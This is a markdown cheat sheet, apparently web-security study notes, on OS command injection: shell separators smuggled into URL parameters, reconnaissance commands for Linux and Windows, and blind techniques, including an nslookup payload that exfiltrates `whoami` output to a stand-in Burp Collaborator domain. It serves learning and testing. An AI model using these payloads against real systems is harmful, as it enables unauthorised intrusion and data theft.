# Remote code execution

## Summary
* [Executing arbitrary commands](#executin-arbitrary-commands)
* [Ways of performing OS injection](#ways-of-performing-os-injection)
* [Useful commands to test for RCE](#useful-commands-to-test-for-rce)
    * [Linux](#linux)
    * [Windows](#windows)
* [Blind OS command injection](#blind-os-command-injection)
    * [Detect blind RCE with time delay](#detecting-blind-os-command-injection-using-time-delays)
    * [Blind RCE by redirecting output](#exploiting-blind-os-command-injection-by-redirecting-output)
    * [Blind RCE with OAST](#exploiting-blind-os-command-injection-with-oast)
    * [Blind RCE with OAST data exfiltration](#exploiting-blind-os-command-injection-with-oast-data-exfiltration)

## Executing arbitrary commands
Suppose a website lets the user to view some particular items
```
> http://example.com?items=2
> an attacker can inject an arbitrary command in the items parameter
> http://example.com?items=&whoami&
> the & character is a shell command separator
> placing the & after the injected commands is useful as it separates the injected command from whatever follows the injection point.
```
## Ways of performing OS injection
```
|whoami|
&whoami&
&&whoami&&
||whoami||
;whoami;
\nwhoami\n
`whoami`
$(whoami)
'whoami'
"whoami"
who\ami
```
## Useful commands to test for RCE
### Linux
```
whoami (name of current user)
uname -a (Operating system)
ifconfig (network configuration)
netstat -an (network connections)
ps -ef (running processes)
```
### Windows
```
whoami (name of current user)
ver (Operating system)
ipconfig /all (network configuration)
netstat -an (network connections)
tasklist (running processes)
```

## Blind OS command injection
### Detecting blind os command injection using time delays
```
> & ping -c 10 127.0.0.1 &
> note the & is used as separator
> this command will cause the application to ping its loopback network adapter for 10 seconds
```
### Exploiting blind OS command injection by redirecting output
```
> this will only works if there is a file within the web root that you can then retrieve from the browser
> let's say there is a file that we can retrieve, /var/www/images
> an attacker can redirect their command injection output to a file in the path of /var/www/images
    # productId=test|whoami > /var/www/images/whoami.txt
> requesting for the path /var/www/images/whoami.txt will reveal the output of the OS injection
```

### Exploiting blind OS command injection with OAST
```
> an attacker can trigger an application to make an interaction with external domain
> using Burp Collaborator, submit the following command
    # productId=test||nslookup BURP-COLLABORATOR.COM||
> click POLL NOW on Collaborator client and observe there is an interaction made by the target application
```
### Exploiting blind OS command injection with OAST data exfiltration
```
> an attacker can execute a system command and exfiltrate the output via a DNS query to an external domain
> using Burp Collaborator, submit the following command
    # productId=test||nslookup `whoami`.BURP-COLLABORATOR.COM||
> click POLL NOW on Collaborator client and observe there is an interaction made by the target application
> notice in the DNS query, a username is included as well with the domain name
```
